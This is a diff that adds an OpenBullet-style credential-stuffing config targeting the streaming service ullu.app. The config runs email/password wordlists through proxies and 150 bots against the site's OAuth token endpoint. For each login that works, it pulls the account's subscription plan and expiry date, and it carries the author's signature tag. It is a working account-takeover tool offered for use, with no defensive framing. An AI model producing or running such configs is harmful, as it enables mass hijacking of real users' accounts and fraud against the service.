@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "Name": "ullu.app",
+  "SuggestedBots": 150,
+  "LastModified": "2019-05-11T16:32:31.9826079+05:30",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#__✘-Gunpoint69EST REQUEST POST "https://ullu.app/ulluCore/oauth/token" 
+  CONTENT "grant_type=password&scope=read%20write&username=<USER>&password=<PASS>&client_id=consumerWeb&client_secret=consumerWeb%40123" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: ullu.app" 
+  HEADER "Origin: https://ullu.app" 
+  HEADER "Referer: https://ullu.app/" 
+
+#__✘-Gunpoint69EST KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "\":\"User not found..\"}" 
+    KEY "Bad credentials" 
+
+#__✘-Gunpoint69EST PARSE "<SOURCE>" JSON "access_token" -> VAR "token" 
+
+#__✘-Gunpoint69EST REQUEST GET "https://ullu.app/ulluCore/api/v1/user/currentUser/detailsFull/secure?fields=consumerSubscription.*" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "Host: ullu.app" 
+  HEADER "Referer: https://ullu.app/" 
+
+#__✘-Gunpoint69EST KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "subscriptionStatus\":\"ACTIVE\",\"" 
+
+#__✘-Gunpoint69EST PARSE "<SOURCE>" JSON "title" -> CAP "plan" 
+
+#__✘-Gunpoint69EST PARSE "<SOURCE>" JSON "subscriptionEndDateTime" -> CAP "Expiry" "" "  _✘-Gunpoint69" 
+
